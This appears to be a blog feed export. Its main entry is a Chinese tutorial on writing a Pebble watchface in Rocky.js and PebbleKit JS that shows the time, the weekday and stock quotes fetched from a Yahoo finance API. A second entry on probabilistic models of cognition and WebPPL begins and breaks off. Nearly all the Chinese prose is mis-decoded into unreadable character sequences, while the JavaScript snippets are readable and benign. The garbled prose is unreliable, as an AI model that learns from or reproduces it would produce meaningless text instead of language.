Pebble ä¸Šé ­çš„ app åŸºæœ¬ä¸Šéƒ½æ˜¯ä»¥ C èªè¨€æ’°å¯«ç‚ºä¸»ï¼Œè€Œè·é›¢æˆ‘ä¸Šæ¬¡å¯« C å¤§ç´„æ˜¯è‡‰æ›¸é‚„æ²’åœ¨å°ç£å‡ºç¾çš„æ™‚ä»£â€¦ä¸éæ²’é—œä¿‚ï¼ŒPebble æ²’æœ‰æ¨æ£„ Javascript é€™å€‹å¼·å¤§çš„èªè¨€ï¼Œæˆ‘å€‘é‚„èƒ½åˆ©ç”¨ Javascript API èˆ‡ å®˜æ–¹å‡ºçš„ Rocky.js ä¾†æ’°å¯« Pebble watchfaceï¼(åªæ˜¯ç›®å‰ä¸æ”¯æ´ ES6)
ç„¶è€Œï¼Œå·¥æ¬²å–„å…¶äº‹ï¼Œå¿…å…ˆåˆ©å…¶å™¨ï¼Œé–‹ç™¼ iOS æˆ‘å€‘æœƒæƒ³åˆ° Xcodeï¼Œé–‹ç™¼ Android æˆ‘å€‘æœ‰ Andriod studioï¼Œé–‹ç™¼ Pebble å‘¢ï¼Ÿ
IDE - Cloudpebble

é›–ç„¶ä½ ä¹Ÿå¯ä»¥é€é command line å»ç·¨è­¯ Pebble çš„ç¨‹å¼ï¼Œä½†æˆ‘é‚„æ˜¯è¦æ¨è–¦è·Ÿä»‹ç´¹ä»–å€‘çš„é›²ç«¯ IDEï¼Œå› ç‚ºæ•´åˆå¾—è »å¥½çš„ï¼Œåªè¦ä»¥ Pebble çš„å¸³è™Ÿç™»å…¥ï¼ˆä¸€é–‹å§‹è¨­å®šä½ çš„æ‰‹éŒ¶æ™‚å°±æœƒè¦æ±‚ä½ è¨»å†Šï¼‰ï¼Œå°±å¯ä»¥ç„¡ç—›é€£æ¥ä½ çš„æ‰‹æ©Ÿèˆ‡ Pebble watchã€‚å³ä¾¿é–‹ç™¼é«”é©—ä¸Šé¢é‚„æœ‰è¨±å¤šå¯ä»¥åŠ å¼·çš„éƒ¨åˆ†ï¼Œä½†æ˜¯å·²ç¶“æ˜¯éå¸¸æ–¹ä¾¿çš„å·¥å…·äº†ï¼Œè€Œä¸”é‚„æœ‰ä¸­æ–‡ï¼
Start a new project

ç•¶ä½ ç™»å…¥å¾Œå¯ä»¥çœ‹åˆ°å¾ˆç°¡å–®çš„ä»‹é¢ï¼Œåˆ—å‡ºç›®å‰æ“æœ‰çš„å°ˆæ¡ˆï¼ŒæŒ‰ä¸‹å»ºç«‹æŒ‰éˆ•ä¾†æ–°å¢ã€‚


é€™é‚Šä½ æœƒçœ‹åˆ°å¥½å¹¾ç¨®é¸é …ï¼ŒPebble C SDK æ‡‰è©²å¯ä»¥ç®—æ˜¯æœ€ä¸»è¦çš„é–‹ç™¼å·¥å…·ï¼Œå¯ä»¥å¯« watchface ä¹Ÿå¯ä»¥å¯« appï¼Œè€Œ Pebble.js ä¼¼ä¹æ˜¯è¼ƒç‚ºèˆŠç‰ˆçš„ javascript SDKï¼Œæˆ‘å€‘ä»Šå¤©è¦ä»‹ç´¹çš„ Rocky.jsä¹Ÿé‚„åœ¨æŒçºŒæ›´æ–°ä¸­ã€‚
é¸äº† Rocky.js å¾Œï¼Œå°±å¯ä»¥é–‹å§‹é€²è¡Œæˆ‘å€‘ä»Šå¤©çš„é–‹ç™¼äº†ï¼
å…ˆçµ¦å¤§å®¶çœ‹ä¸€ä¸‹é–‹ç™¼å®Œæˆå¾Œï¼Œå¾ IDE ä¸Šçš„æ¨¡æ“¬å™¨çœ‹èµ·ä¾†æœƒé•·ä»€éº¼æ¨£å­ã€‚


å·¦é‚Šå¤§å¤§ç§€å‡ºæ™‚é–“ï¼Œå³ä¸Šè§’é¡¯ç¤ºæ˜ŸæœŸå¹¾ï¼Œå³ä¸‹è§’å‰‡æ˜¯è‚¡ç¥¨è³‡è¨Šã€‚
Something you should know before you start to codePebble watchface çš„ js é–‹ç™¼å¤§è‡´ä¸Šåˆ†ç‚ºå…©å¡Šï¼šRocky JS èˆ‡ PebbleKit JS
Rocky JS è² è²¬æ‰‹éŒ¶ç«¯çš„ç¨‹å¼ï¼ŒåŒ…å« UI ç¹ªè£½ä»¥åŠèˆ‡æ‰‹æ©Ÿç«¯çš„æºé€šã€‚
PebbleKit JS æˆ‘å€‘å…ˆå‰ä¸¦æ²’æœ‰æåˆ°ï¼Œä»–æ˜¯é‹è¡Œåœ¨æ‰‹æ©Ÿç«¯çš„ç¨‹å¼ï¼Œæœƒå®‰è£åœ¨ä½ æ‰‹æ©Ÿçš„ Pebble app å…§ï¼Œä¸»è¦è² è²¬èˆ‡å…¶ä»– Web Service æºé€šï¼Œä¸¦å°‡è¨Šæ¯å‚³çµ¦æ‰‹éŒ¶ä½œç•«é¢ä¸Šçš„é¡¯ç¤ºèˆ‡æ›´æ–°ã€‚
åŸºæœ¬ä¸Šå…©è€…éƒ½æ˜¯ Javascriptï¼Œåªæ˜¯å¤šäº† Pebble æä¾›çš„ APIã€‚
Coding Time!IDE å·¦é‚Šçš„åˆ—è¡¨ä¸­æœ‰è¨±å¤šé¸é …ï¼Œæˆ‘å€‘æœƒå…ˆéœ€è¦æ–°å¢ä¸€å€‹ index.jsï¼ŒæŒ‰ä¸‹ ADD NEW button


æœ‰ä¸‰ç¨®é¡å‹çš„ javascript æª”æ¡ˆå¯ä»¥é¸æ“‡ï¼Œæˆ‘å€‘å…ˆé–‹ç™¼ Rocky.jsï¼Œç¹ªè£½åŸºæœ¬çš„æ™‚é–“å‡ºä¾†ã€‚
å…ˆ include rocky.js
var rocky = require(&#x27;rocky&#x27;);
RockyJS çš„ API å¾ˆç°¡å–®ï¼Œä¸»è¦æ˜¯ä¸€ç¨® Event-based çš„æ„Ÿè¦ºï¼Œæˆ‘å€‘å¯ä»¥é€éè¨»å†Šä¸€å€‹ minutechange çš„ event ä¾†ç›£è½ åˆ†é˜ çš„è®ŠåŒ–ã€‚
rocky.on(&#x27;minutechange&#x27;, function(event) &#123;  // Request the screen to be redrawn on next pass  rocky.requestDraw();&#125;);

æ¯åˆ†é˜æˆ‘å€‘éƒ½å‘¼å«ä¸€æ¬¡ rocky.requestDraw()ï¼Œé€éé€™å€‹ function æˆ‘å€‘å¯ä»¥ç™¼å‡ºä¸€å€‹ Draw çš„ eventï¼Œè€Œè©² event æœƒå¸¶è‘—ä¸€å€‹åŒ…å« CanvasRenderingContext2D ç‰©ä»¶çš„åƒæ•¸ï¼Œæ ¹æ“šé€™å€‹åƒæ•¸æˆ‘å€‘å¯ä»¥æœ‰è¨±å¤š Canvas ç›¸é—œçš„ API å¯ä»¥ä½¿ç”¨ï¼Œä¾†ç¹ªè£½æˆ‘å€‘æƒ³è¦çš„ç•«é¢ã€‚
æ—¢ç„¶æ˜¯è§¸ç™¼äº‹ä»¶ï¼Œç†æ‰€ç•¶ç„¶å°±æ˜¯è¨»å†Šä¸€å€‹ Listener ä¾†è™•ç†ã€‚
rocky.on(&#x27;draw&#x27;, function(event) &#123;  var ctx = event.context;  // Clear the screen  ctx.clearRect(0, 0, ctx.canvas.clientWidth, ctx.canvas.clientHeight);  // Determine the width and height of the display  var w = ctx.canvas.unobstructedWidth;  var h = ctx.canvas.unobstructedHeight;  drawAPI.drawDigital(ctx, w * (1/5) + 10, h * (1/5) - 5, &#x27;white&#x27;, &#x27;49px Roboto-subset&#x27; );  drawAPI.drawDay(ctx,  w * (4/5) - 5, h * (1/5) - 15);  // Draw Stock on the bottom of the screen, if available  if (stockData) &#123;    drawAPI.drawStock(ctx, stockData, w * (4/5) - 15, h * (3/5) - 10);  &#125;&#125;);

åœ¨é€™æ®µ Listener ä¸­ï¼Œæˆ‘åšäº†å¹¾ä»¶äº‹æƒ…ï¼š

å¾ event ä¸­å°‡ context å–å‡ºä¾†ï¼Œä¹Ÿå°±æ˜¯å…ˆå‰æåˆ°çš„ CanvasRenderingContext2Dï¼Œä¸¦ä¸”å…ˆé€é clearRect() å°‡è¢å¹•æ¸…ä¹¾æ·¨ï¼Œå› ç‚ºæ¯æ¬¡è¢«å‘¼å«åˆ°çš„æ™‚å€™ï¼Œéƒ½ä»£è¡¨æˆ‘å€‘è¦é‡æ–°ç¹ªè£½ç•«é¢ã€‚

å°‡è¢å¹•ç•«å¸ƒçš„å¯¬é«˜æš«å­˜èµ·ä¾†ï¼Œç”¨æ–¼ä¹‹å¾Œç¹ªè£½å…¶ä»–åœ–å½¢æ™‚è¨ˆç®—å„è‡ªè¦æ“ºæ”¾çš„åº§æ¨™ä½ç½®ã€‚

å‘¼å« drawAPI ä¾†ç¹ªè£½éœ€è¦çš„å…§å®¹ã€‚drawAPI æ˜¯æˆ‘å¦å¤–å¯«çš„ä¸€å€‹ js fileï¼Œå°‡ç¹ªåœ–é‚è¼¯èˆ‡ä¸»è¦ API åšå€‹åˆ†é›¢ã€‚åœ¨é€™é‚Šæˆ‘å€‘ä¸€æ¨£èƒ½å¤ é€é require()å°‡æˆ‘å€‘è‡ªå·±å¯«çš„ js æª”æ¡ˆåŒ¯å…¥ã€‚

æœ€å¾Œæ˜¯ç•¶æœ‰è‚¡ç¥¨è³‡æ–™å­˜åœ¨çš„æ™‚å€™ï¼Œç¹ªè£½è‚¡ç¥¨è³‡è¨Šï¼Œé€™éƒ¨åˆ†ç¨å¾Œè¬›åˆ° PebbleKit.js çš„æ™‚å€™æœƒå†æåˆ°ã€‚


ä¸»è¦çš„é‚è¼¯å°±é€™éº¼ç°¡å–®ï¼Œè¨»å†Š listenerï¼Œåˆ†ç™¼ requestDraw äº‹ä»¶ï¼Œç„¶å¾Œé‡ç¹ªç•«é¢ï¼
How to draw?æ¥è‘—å°±æ˜¯è¦ç™¼æ®ä½ å€‘è—è¡“å®¶å¤©ä»½çš„æ™‚åˆ»äº†ï¼Œåˆ©ç”¨ CanvasRenderingContext2D æä¾›çš„ä»‹é¢ï¼Œæˆ‘å€‘å¯ä»¥è¼•æ˜“åœ°ç•«å‡ºé•·æ–¹é«”ã€åœ“å½¢ã€è·¯å¾‘èˆ‡æ–‡å­—ï¼Œä¸¦ä¸”è¨­å®šé¡è‰²èˆ‡å­—å‹å¤§å°ç­‰ç­‰ï¼Œè©³ç´°çš„ API åƒæ•¸å¯ä»¥ç›´æ¥åƒè€ƒå®˜ç¶²ï¼Œå› ç‚ºèƒ½ç”¨çš„ API å…¶å¯¦ä¸å¤šï¼Œæ‰€ä»¥çœ‹èµ·ä¾†ä¹Ÿå¾ˆæ¸…æ¥šã€‚
CanvasRenderingContext2D API Doc
é€™é‚Šè¬›è§£æˆ‘ç”¨åˆ°çš„éƒ¨åˆ†ï¼š
drawAPI.drawDigital(ctx, w * (1/5) + 10, h * (1/5) - 5, &#x27;white&#x27;, &#x27;49px Roboto-subset&#x27; );

 drawDigital æ˜¯ç”¨ä¾†ç¹ªè£½ç•«é¢ä¸Šçš„æ•¸ä½æ™‚é–“ï¼Œä¹Ÿå°±æ˜¯è¢å¹•å·¦é‚Šå¤§å¤§çš„æ•¸å­—ï¼Œåƒæ•¸å¾ˆç°¡å–®ï¼Œå°±æ˜¯ context objectã€x, y çš„åº§æ¨™ä½ç½®ã€é¡è‰²èˆ‡å­—å‹å¤§å°ã€‚
 é€™é‚Šæœ‰å…©é»è¦æ³¨æ„ï¼Œåº§æ¨™ä½ç½®è·Ÿä¸€èˆ¬ web ä¸Šçš„æ¨™æº–ä¸€æ¨£ï¼Œè¢å¹•å·¦ä¸Šè§’ç‚º (0, 0)ï¼Œè¨ˆç®—æ¯å€‹åœ–å½¢çš„ä½ç½®æœƒæ˜¯åˆæœŸé–‹ç™¼ç°¡å–®çš„ watchface ä¸­è¼ƒç‚ºéº»ç…©çš„åœ°æ–¹ï¼Œå› ç‚ºç•«é¢å¾ˆå°ï¼Œä½ è¦å¥½å¥½èª¿æ•´æ‰è¡Œã€‚
å¦å¤–ä¸€å€‹è¦å°å¿ƒçš„æ˜¯ï¼Œé›–ç„¶ä½ çœ‹é€™é‚Šçš„å­—å‹å¤§å°å¯«æ³•ï¼Œä¼¼ä¹è·Ÿä¸€èˆ¬ CSS çš„æ ¼å¼ä¸€æ¨£ï¼Œä½†ä½ å¯ä¸èƒ½è‡ªå·±éš¨æ„äº‚åŠ å¤§å°æˆ–æ˜¯ font-familyï¼Œéœ€è¦ä½¿ç”¨å®ƒå€‘å®šç¾©å¥½çš„æ‰èƒ½ç”Ÿæ•ˆã€‚å¯ç”¨å­—å‹åˆ—è¡¨-link
å¯¦éš›çš„ drawDigital function
var hourAndMin = new Date()                .toLocaleTimeString()                .split(&#x27;:&#x27;)                .splice(0,2);var hourText = hourAndMin[0];var minutesText = hourAndMin[1];ctx.fillStyle = color;ctx.textAlign = &#x27;center&#x27;;ctx.font = font;ctx.fillText(hourText, cx, cy - 20, 70);ctx.fillText(minutesText, cx, cy + 35, 70);
é€é ctx å¯ä»¥è¨­å®š fillStyleã€textAlignã€font styleï¼Œä¸¦ä½¿ç”¨ fillText() ä¾†å°‡æ–‡å­—ç¹ªè£½åœ¨ç•«é¢ï¼Œåƒæ•¸åˆ†åˆ¥æ˜¯ï¼šæ–‡å­—å…§å®¹, x åº§æ¨™, y åº§æ¨™, æœ€å¤§å¯¬åº¦(option)ï¼Œè‹¥ä½ æœ‰è¨­å®šæœ€å¤§å¯¬åº¦ï¼Œç•¶ä½ çš„æ–‡å­—å¤§æ–¼é€™å¯¬åº¦æ™‚ï¼Œæœƒè‡ªå‹•ä½¿ç”¨è¼ƒå°çš„å­—é«”ã€‚
ç¹ªè£½æ˜ŸæœŸçš„éƒ¨åˆ†å…¶å¯¦èˆ‡æ™‚é–“å¤§åŒå°ç•°ï¼Œç›´æ¥çœ‹ç¨‹å¼ç¢¼ï¼š
var day = &#x27;&#x27;;switch (new Date().getDay()) &#123;  case 0:      day = &quot;SUN&quot;;      break;  case 1:      day = &quot;MON&quot;;      break;  case 2:      day = &quot;TUE&quot;;      break;  case 3:      day = &quot;WED&quot;;      break;  case 4:      day = &quot;THU&quot;;      break;  case 5:      day = &quot;FRI&quot;;      break;  case 6:      day = &quot;SAT&quot;;  &#125;  ctx.fillStyle = &#x27;lightgray&#x27;;  ctx.textAlign = &#x27;center&#x27;;  ctx.font = &#x27;24px bold Gothic&#x27;;  ctx.fillText(day, cx, cy, 30);

ç•¶ä½ å¯«å®Œé€™äº›å¾Œï¼Œä½ å°±å¯ä»¥å…ˆè©¦è‘—åŸ·è¡Œçœ‹çœ‹ã€‚
é»æ“Šå³é‚Šé¸é …ä¸­çš„æ’­æ”¾éµï¼Œå°±æœƒè‡ªå‹•ç·¨è­¯ä¸¦å•Ÿå‹•æ¨¡æ“¬å™¨ã€‚è‹¥æ˜¯æ²’æœ‰å•é¡Œï¼Œä½ æœƒçœ‹åˆ°æ¨¡æ“¬å™¨é–‹å•Ÿï¼Œä¸¦å‡ºç¾ä¸€æ¢ progress bar é¡¯ç¤ºæ­£åœ¨å®‰è£ï¼Œç¬¬ä¸€æ¬¡æœƒæ¯”è¼ƒä¹…ä¸€é»ã€‚
æˆåŠŸå¾Œå°±æœƒå‡ºç¾ç•«é¢ï¼Œä¸¦æœ‰å€‹å½ˆè·³è¦–çª—å‡ºä¾†ï¼Œé€™é‚Šå¯èƒ½æ˜¯ç¿»è­¯å•é¡Œï¼Œæ‰€è¬‚çš„ è§£é™¤ å…¶å¯¦å°±åªæ˜¯å–æ¶ˆé€™å€‹å½ˆè·³è¦–çª—ç½·äº†ï¼Œæˆ‘ä¸€é–‹å§‹é‚„ä¸å¤ªæ•¢æŒ‰ï¼Œæ€•ä»–æŠŠæˆ‘çš„ App è§£é™¤å®‰è£ XD


Fetch Stock Dataæ—¢ç„¶æ˜¯æ™ºæ…§æ‰‹éŒ¶ï¼Œç•¶ç„¶ä¸èƒ½åªæœ‰å–®ç´”çš„é¡¯ç¤ºæ™‚é–“ï¼Œæ¥ä¸‹ä¾†èªªæ˜æ€éº¼æ¨£æ­é… PebbleKitJS é€éä½ çš„æ‰‹æ©Ÿä¾†ç²å– Web è³‡æ–™ï¼Œä¸¦å‚³é€çµ¦æ‰‹æ©Ÿé¡¯ç¤ºã€‚
PebbleKit JS æ˜¯é‹è¡Œåœ¨ä½ æ‰‹æ©Ÿç«¯çš„ Pebble app è£¡é¢ï¼Œä¸€æ¨£ä¹Ÿæ˜¯ Event-based çš„æ–¹å¼ï¼š
Pebble.on(&#x27;message&#x27;, function(event) &#123;    ...&#125;);
å› ç‚ºæ˜¯é‹è¡Œåœ¨ Pebble è‡ªå·±çš„ç’°å¢ƒä¸‹ï¼Œæ‰€ä»¥æˆ‘å€‘é€™é‚Šä¸éœ€è¦ require ä»€éº¼ libraryï¼Œç›´æ¥è¨»å†Š message event çš„ listener å³å¯ã€‚
æ‰‹éŒ¶ç«¯çš„ RockyJS å¯ä»¥é€é postMessage() å‚³é€è¨Šæ¯çµ¦ PebbleKitï¼Œç•¶ PebbleKit çš„ listener ç›£è½åˆ°å‚³é€éä¾†çš„ message äº‹ä»¶å¾Œï¼Œå°±å¯ä»¥æ¡å–ç›¸å°æ‡‰çš„æªæ–½ï¼Œåƒæ˜¯ç™¼é€ Ajax æŠ“å– web è³‡æ–™ï¼Œä¸¦åŒæ¨£é€é postMessage() å°‡è³‡æ–™å‚³å›çµ¦æ‰‹éŒ¶ç«¯çš„ RockyJSã€‚
å®Œæ•´çš„æ‰‹æ©Ÿç«¯ PebbleKit JS 
// Get the message that was passedvar message = event.data;// we random pick one of these stock symbol to showvar stockSymbols = [&#x27;YHOO&#x27;, &#x27;GOOGL&#x27;, &#x27;AAPL&#x27;];var randStockSymbol = stockSymbols[Math.floor(Math.random() * stockSymbols.length)];if (message.fetch) &#123;// use yql to fetch data (don&#x27;t use in productin or sell)var url = &#x27;https://query.yahooapis.com/v1/public/yql&#x27; +     &#x27;?q=select * from yahoo.finance.quotes where symbol in &#x27; +    &#x27;(&quot;&#x27;+randStockSymbol+&#x27;&quot;)&amp;format=json&amp;env=store://datatables.org/alltableswithkeys&amp;callback=&#x27;;  request(encodeURI(url), &#x27;GET&#x27;, function(respText) &#123;    var stockData = JSON.parse(respText);    Pebble.postMessage(&#123;      &#x27;stockData&#x27;: &#123;        &#x27;symbol&#x27;: stockData.query.results.quote.symbol,        &#x27;Ask&#x27;: stockData.query.results.quote.Ask,        &#x27;Bid&#x27;: stockData.query.results.quote.Bid      &#125;    &#125;);  &#125;);&#125;

è¨»1: å› ç‚ºä¸èƒ½ç”¨ es6 ä¾†å¯«ï¼Œæ‰€ä»¥ä¹Ÿæ²’æœ‰ fetch å¯ä»¥ç”¨ï¼Œæ‰€ä»¥é€™é‚Šçš„ request æ˜¯è‡ªå·±å¯«çš„ XMLHttpRequest functionã€‚è¨»2: è¨˜å¾— encodeURI ä¸€ä¸‹ urlï¼Œå¦å‰‡æœ‰å¯èƒ½æœƒå‡ºç¾ invalid url error
æ¥è‘—æˆ‘å€‘å›åˆ°æ‰‹éŒ¶ç«¯çš„ RockyJSï¼Œåœ¨åŸæœ¬çš„ç¨‹å¼ä¸‹åŠ å…¥é€™å…©æ®µï¼š
rocky.on(&#x27;hourchange&#x27;, function(event) &#123;  // Send a message to fetch the weather information (on startup and every hour)  rocky.postMessage(&#123;&#x27;fetch&#x27;: true&#125;);&#125;);rocky.on(&#x27;message&#x27;, function(event) &#123;  // Receive a message from the mobile device (pkjs)  var message = event.data;  if (message.stockData) &#123;    // Save the stockData data    stockData = message.stockData;    // Request a redraw so we see the information    rocky.requestDraw();  &#125;&#125;);

åœ¨ hourchange äº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œæˆ‘å€‘ postMessage() å‘Šè¨´ PebbleKitJS éœ€è¦å»æŠ“å–æ–°è³‡æ–™ï¼Œä¸¦ä¸”è¨»å†Š message çš„ event listenerï¼Œç•¶è³‡æ–™å‚³é€å›ä¾†æ™‚ï¼Œæˆ‘å€‘é‡ç¹ªè£½ç•«é¢ã€‚ï¼ˆé€™é‚Šç›´æ¥æŠŠè³‡æ–™å­˜åœ¨å…¨åŸŸè®Šæ•¸ï¼Œæ–¹ä¾¿è®€å–ï¼‰
Final Result!Tada~ è‚¡ç¥¨è³‡è¨Šå°±å‡ºç¾äº†ï¼


ç•¶ç„¶ä¸èƒ½ä¸€ç›´åœ¨æ¨¡æ“¬å™¨ä¸Šè·‘ï¼Œæˆ‘å€‘è¦å®‰è£åˆ°æ‰‹éŒ¶ä¸Šï¼


é»é¸å·¦é‚Šé¸é …åˆ—è¡¨çš„ ç·¨è£½ï¼Œé¸æ“‡ PHONEï¼Œä¸¦å®‰è£åŸ·è¡Œå³å¯ï¼
è¨˜å¾—æ‰“é–‹æ‰‹æ©Ÿä¸Š Pebble app å…§çš„ developer mode


ç·¨è­¯æˆåŠŸçš„è©±å°±å¯ä»¥åœ¨æ‰‹éŒ¶ä¸Šçœ‹åˆ°ç•«é¢ï¼Œè‹¥å¤±æ•—æœ‰å•é¡Œï¼Œå¯ä»¥æª¢è¦–ç·¨è­¯çµæœï¼Œå¾ log ä¸­å»æ‰¾å•é¡Œï¼Œåƒæˆ‘ä¸€é–‹å§‹å°±å¿˜è¨˜ encodeURIï¼Œå°è‡´ ajax å‡ºå•é¡Œã€‚


ä¸Šåœ–å…§çš„ PBWï¼Œæ˜¯å¯ä»¥è®“ä½ ä¸‹è¼‰ä¸‹ä¾†ï¼Œä¹‹å¾Œè¦ publish åˆ° store çš„æ™‚å€™æ‰€ä½¿ç”¨çš„ï¼Œè‡³æ–¼æ€éº¼ publishï¼Ÿé€™é‚Šå†è¬›ä¸‹å»ç¯‡å¹…æœ‰é»é•·ï¼Œæœƒå¦å¤–å¯«ä¸€ç¯‡ä¾†ä»‹ç´¹ã€‚
æ‰‹éŒ¶ä¸Šçœ‹èµ·ä¾†é•·é€™æ¨£~


æœ¬æ–‡ä¸­ä»‹ç´¹çš„ç¨‹å¼ç¢¼åœ¨æ­¤ï¼šhttps://github.com/ArvinH/clean-stock-pebble-wf
è‹¥æƒ³çœ‹å®˜ç¶²ä¸ŠæŒ‡é‡æ™‚é˜èˆ‡å¤©æ°£çš„ç¯„ä¾‹ï¼Œæˆ‘ä¹Ÿæœ‰å€‹ä¿®æ”¹ç‰ˆæœ¬çš„ï¼šhttps://github.com/ArvinH/pebble-watchface-starterkit
è³‡æ–™ä¾†æº
Pebble build with JS
Pebble forum

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>pebble</tag>
        <tag>wearable</tag>
        <tag>rocky.js</tag>
        <tag>pebblekit.js</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢ Probabilistic Models of Cognition</title>
    <url>/2018/03/24/prob-model-of-cog-1/</url>
    <content><![CDATA[å‰è¨€æœ€è¿‘é€™å¹¾å¹´ï¼ŒAI çš„ç™¼å±•åˆå†æ¬¡è®Šå¾—è“¬å‹ƒï¼Œæ˜¯ä¸€æ¬¡å¾ˆå¥½çš„æ©Ÿæœƒï¼Œè®“äººå€‘å¯ä»¥æ‰“é€ å‡ºæ¥µæ£’çš„ç§‘æŠ€ä¾†ç‚ºçœ¾äººæœå‹™ã€‚è¿‘å¹´æœ€ç´…çš„æ˜¯æ·±åº¦å­¸ç¿’å·²ç¶“æœ‰å¾ˆå¤šç›¸é—œç ”ç©¶ï¼ŒTB å‘¨åˆŠä¸­ä¹Ÿä¸€ç›´æœƒç‚ºå¤§å®¶æ”¾ä¸Šä¸€äº›æœ€æ–°çš„ç™¼å±•ï¼Œä½†æ˜¯ï¼Œç­†è€…ä¸€ç›´å°æ½›è—åœ¨æˆ‘å€‘å¿ƒæ™ºä¸­çš„åŸºçŸ³å¾ˆæœ‰èˆˆè¶£ï¼Œè€Œé€™äº›åŸºçŸ³ï¼Œå°±è·Ÿä»Šå¤©æƒ³è¦ä»‹ç´¹çš„ Probabilistic Models of Cognition å¾ˆæœ‰é—œä¿‚ã€‚
Probabilistic Models of Cognition çš„åŸºæœ¬æƒ³æ³•å¦‚æœæˆ‘å€‘å°‡äººçš„è…¦è¢‹æƒ³æˆä¸€å€‹ functionï¼Œé€™å€‹ function å¯ä»¥åšå¥½å¤šå¥½å¤šçš„äº‹ã€‚ä¾‹å¦‚çœ‹åˆ°ä¸€æœ¬å¥½æ›¸ã€é‡åˆ°ä¸€å€‹å¥½è€å¸«ã€è½åˆ°ä¸€é–€å¥½èª²ï¼Œæˆ‘å€‘æœƒæƒ³è¦å»æŠŠæ¡ã€æƒ³è¦åˆ†äº«ï¼›ä¾‹å¦‚æˆ‘å€‘çœ‹åˆ°ä¸€å¹…ç¾éº—çš„ç•«ã€ä¸€å€‹å£¯éº—çš„æ™¯è§€ï¼Œæˆ‘å€‘æœƒç™¼å‡ºè®šå˜†ã€æƒ³è·Ÿè‡ªå·±çè¦–çš„äººä¸€èµ·æ¬£è³ï¼›é‡åˆ°åƒåƒè¬è¬ç¨®ä¸åŒçš„ inputï¼Œæˆ‘å€‘æœƒæœ‰åƒåƒè¬è¬ç¨®ä¸åŒçš„æƒ³æ³•ã€‚
é›–ç„¶æˆ‘å€‘å¯ä»¥è™•ç†åƒåƒè¬è¬ç¨®æƒ…å¢ƒï¼Œç”¢ç”Ÿåƒåƒè¬è¬ç¨®æƒ³æ³•ï¼Œä½†æ˜¯ï¼Œæˆ‘å€‘è™•ç†é€™åƒåƒè¬è¬ç¨®æƒ…å¢ƒæ™‚ï¼Œä½¿ç”¨çš„åŸºçŸ³å¯èƒ½å¾ˆå°‘ã€‚ä¾‹å¦‚ï¼Œæˆ‘å€‘åªè¦çŸ¥é“ï¼š

ç‰©é«”æœ‰é‡é‡ï¼ˆåŸºçŸ³ Aï¼‰
æŠ“ä½ç‰©é«”ã€æŠµæŠ—é‡åŠ›æ‰èƒ½æ‹¿èµ·ç‰©é«”ï¼ˆåŸºçŸ³ Bï¼‰
ç”¨åŠ›æ‹‹å‡ºç‰©é«”ï¼Œç‰©é«”æœƒé£›è¡Œï¼ˆåŸºçŸ³ Cï¼‰å°±å¯ä»¥ä¸Ÿå‡ºæ•¸ä»¥åƒè¨ˆç¨®ç‰©é«”ï¼ˆå·²ç°¡åŒ–ï¼Œé‚„éœ€è¦çœ‹å¾—åˆ°ç‰©é«”ä½ç½®ã€èƒ½å¤ æ“æ§æ‰‹..ç­‰ç­‰æ¢ä»¶ï¼‰ã€‚

å¦‚æœèƒ½æŒæ¡é€™äº›åŸºçŸ³ï¼Œé‚£æˆ‘å€‘æ˜¯ä¸æ˜¯å°±å¯ä»¥ç”¨é€™äº›åŸºçŸ³ä¾†ç”¢ç”Ÿè¡Œç‚ºï¼Ÿåˆ©ç”¨åŸºçŸ³ä¾†ç”¢ç”Ÿè¡Œç‚ºï¼Œå°±è¡¨ç¤ºé€™äº›åŸºçŸ³æ˜¯ generative çš„ modelã€‚
ä½†æ˜¯ï¼Œé€™äº›åŸºçŸ³åˆå„è‡ªæ½›è—äº†ä¸€äº›è®Šæ•¸ï¼Œä¾‹å¦‚æ‹‹å‡ºå»çš„åŠ›è¦å¤šå¤§æ‰å°ï¼Ÿæ˜¯å¦æ²’è€ƒæ…®åˆ°ç©ºæ°£é˜»åŠ›ï¼Ÿæ‰€ä»¥è£¡é¢æœ‰ä¸€äº›æˆ‘å€‘æœªå®Œæ•´ç†è§£ï¼ˆä¹Ÿå°±æ˜¯æˆ‘å€‘ç†è§£é€™å€‹ä¸–ç•Œï¼Œå½¢æˆçš„ modelï¼Œé‚„ä¸å®Œæ•´ï¼‰ï¼Œæ‰€ä»¥åŠ å…¥éš¨æ©Ÿçš„æˆåˆ†ï¼Œé€™ä¹Ÿæ˜¯ Probabilistic Models of Cognition åç¨±çš„ç”±ä¾†ã€‚
WebPPLç‚ºäº†ç”¨æ¯”è¼ƒæ­£è¦çš„ç¨‹å¼èªè¨€ä¾†æè¿°æˆ‘å€‘å¿ƒæ™ºä¸­çš„åŸºçŸ³ï¼ˆä¹Ÿå°±æ˜¯ Probabilistic modelï¼‰ï¼Œä½œè€…æ¨å‡ºäº†ä¸€ç¨®ç¨‹å¼èªè¨€ï¼Œå«åš probabilistic programming for the web ï¼ˆWebPPLï¼‰ã€‚
æˆ‘å€‘å¯ä»¥ä½¿ç”¨é€™å€‹èªè¨€ä¾†ç‚ºä¸–ç•Œå»ºç«‹ç°¡å–®çš„æ¨¡å‹ï¼Œç”šè‡³è·‘æ¨¡æ“¬ï¼Œå¦å¤–ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨è£¡é¢å¯¦ä½œçš„æ¨ç†åŠŸèƒ½ä¾†åšç°¡å–®çš„æ¨ç†ã€‚
æˆ‘å€‘ç›®å‰åªè¦çŸ¥é“é€™æ¨£å°±å¥½ï¼Œèªæ³•é‚£äº›çš„æœ‰èˆˆè¶£å¯ä»¥çœ‹çœ‹ é€™å€‹ç¶²ç«™ï¼ŒåŸºæœ¬ä¸Šæ˜¯ç”± Javascript å»¶ä¼¸è€Œä¾†ã€‚
Generative model
One view of knowledge is that the mind maintains working models of parts of the world. â€˜Modelâ€™ in the sense that it captures some of the structure in the world, but not all (and what it captures need not be exactly what is in the worldâ€”just useful).

ä¸Šé¢é€™æ®µè©±æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Œæˆ‘å€‘ä¾†çœ‹å€‹å°å°çš„ç¯„ä¾‹ï¼ˆä¸‹é¢çš„ç¯„ä¾‹å¯ä»¥åœ¨ conditioning é€™ä¸€ç« ç¯€ä¸­çœ‹åˆ°ï¼‰ï¼š
